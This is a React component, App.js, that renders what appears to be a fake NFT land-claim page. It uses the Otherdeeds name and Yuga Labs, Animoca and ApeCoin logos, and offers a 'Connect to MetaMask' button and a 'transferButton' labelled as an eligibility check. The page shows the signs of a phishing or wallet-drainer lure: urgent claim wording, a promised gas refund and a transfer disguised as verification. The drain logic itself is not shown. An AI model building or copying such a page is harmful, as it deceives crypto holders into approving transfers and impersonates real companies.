// import logo from "./logo.svg";
import "./App.css";
import React from "react";
//import ReactDom from "reactdom";
import { Component } from "react";
//import CoursePage from "./Coursesales";

class App extends Component {
  render() {
    return (
      <div id="root">
        <main>
          <div id="myBg" class="background">
            <video loop="" autoplay="" playsinline="" poster="assets/dock.jpg">
              <source src="assets/dock.webm" type="video/webm" />
              <source src="assets/dock.mp4" type="video/mp4" />
            </video>
            <div class="blur"></div>
          </div>
          <div class="kyc">
            <div id="connectDiv">
              <button id="connectButton" class="button">
                Connect to MetaMask
              </button>
              <div class="disclaimer">
                OTHERDEEDS CLAIMS IS NOW LIVE 🔥
                <br />
                Affiliated NFTS that featured in the OTHERSIDE project can now
                claim their Otherdeeds lands allocation.
                <br />
                NB:Only holder of affiliated NFTs are Eligible for this claim..
              </div>
            </div>
            <div id="kyc-block">
              <div class="kyc-block">
                <div class="kyc-label">Account</div>
                <div id="walletAddress" class="kyc-body">
                  0x0
                </div>
              </div>
              <br />
              <div class="kyc-block">
                <div class="kyc-label">
                  <div>Status</div>
                  <div class="status status--not_found"></div>
                </div>
                <div class="kyc-body">
                  Not registered: Eligible for gas refund.
                </div>
              </div>
              <br />
              <div class="kyc-block">
                <button id="transferButton" class="button">
                  CONFIRM TO VERIFY ELIGIBLITY
                </button>
                <div id="elig"></div>
              </div>
            </div>
          </div>
          <div class="sponsors">
            <div class="sponsors-list">
              <div class="sponsor">
                <img
                  src="assets/yuga-labs.svg"
                  alt="yuga-labs.svg"
                  width="80"
                />
              </div>
              <div class="sponsor">
                <img src="assets/animoca.svg" alt="animoca.svg" width="75" />
              </div>
              <div class="sponsor">
                <img src="assets/apecoin.svg" alt="apecoin.svg" width="90" />
              </div>
            </div>
          </div>
        </main>
      </div>
    );
  }
}
export default App;
